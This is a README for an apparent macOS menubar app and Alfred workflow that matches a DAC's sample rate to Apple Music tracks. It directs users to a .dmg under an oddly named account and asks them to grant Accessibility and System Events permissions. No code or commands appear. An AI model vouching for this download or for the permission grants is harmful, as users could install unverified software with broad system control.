# 🎵 alfred-apple-music-format - Perfect audio quality for Apple Music

[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Famished-articleofcommerce898/alfred-apple-music-format/releases)

This application adjusts your audio hardware settings to match the song playing in Apple Music. It ensures your music reaches your speakers without software-based changes. The software detects the audio format of the track and commands your Digital to Analog Converter (DAC) to use the correct sample rate.

## 🛠 What this tool does

Digital audio files come in various quality levels. Sometimes a file plays at 44.1kHz, while other files play at 96kHz or 192kHz. If your computer does not match these rates, it forces the audio through a conversion process. This process can reduce quality.

This application sits in your menubar and keeps watch on Apple Music. When a new song starts, the app reads the track format. It then tells your Mac to update the audio output settings to match that specific song. It stays out of your way and runs in the background.

## ⚙️ Requirements

- A Mac running macOS 12.0 or newer.
- An external DAC or a high-quality internal audio output.
- Apple Music app installed on your system.
- Permission to control system settings.

## 📥 Installation

1. Visit [this link](https://github.com/Famished-articleofcommerce898/alfred-apple-music-format/releases) to reach the download page.
2. Look for the latest version under the "Assets" section.
3. Click the file ending in .dmg to save it to your Mac.
4. Open the downloaded file once the transfer completes.
5. Drag the application icon into your Applications folder.
6. Open your Applications folder and double-click the program icon to launch it.

## 🏹 Using the Alfred Workflow

This app includes a helper tool for Alfred. Alfred is a productivity tool for macOS. If you use Alfred, this workflow gives you manual control over your audio settings.

1. Install the Alfred application on your Mac.
2. Open the downloaded folder and look for a file ending in .alfredworkflow.
3. Double-click this file to import it into Alfred.
4. Open Alfred and type the name of the workflow command.
5. You can now toggle the automatic switching feature or force a manual sample rate change from the keyboard.

## 💡 Common Questions

### Does this improve sound quality?
Yes. It removes layers of software processing between your music files and your speakers. This provides a clean path for the audio signal.

### What if my DAC does not support a specific rate?
The application reads the capabilities of your hardware. If your DAC lacks support for a high-resolution rate, the app defaults to the highest rate your hardware can handle.

### How do I close the application?
Click the icon in the top menubar. Select "Quit" from the menu. The app stops monitoring your audio immediately.

### Do I need to reconfigure it every time?
No. The application saves your settings. It starts automatically when you log into your computer.

### The app asks for permissions. Should I grant them?
The app needs "Accessibility" and "System Events" permissions to control your Mac audio settings and monitor the Apple Music player. Open System Settings, go to Privacy & Security, and ensure the app has the required access.

## 🚀 Troubleshooting

If the sample rate does not change when a song switches:

1. Check that Apple Music is the active player.
2. Confirm that your DAC is connected and currently selected as the output device in your Mac Sound settings.
3. Restart the application from your Applications folder.
4. Ensure the application appears in your "Login Items" list so it starts whenever your Mac boots.

Many DACs show the current sample rate on a small display. Watch this display when you skip a song. You should see the number change to match the file reported by the application. This confirms the connection works.

The goal of this project remains simplicity. You do not need to manage complex configurations. The application handles the technical work so you can listen to your music files at their intended quality.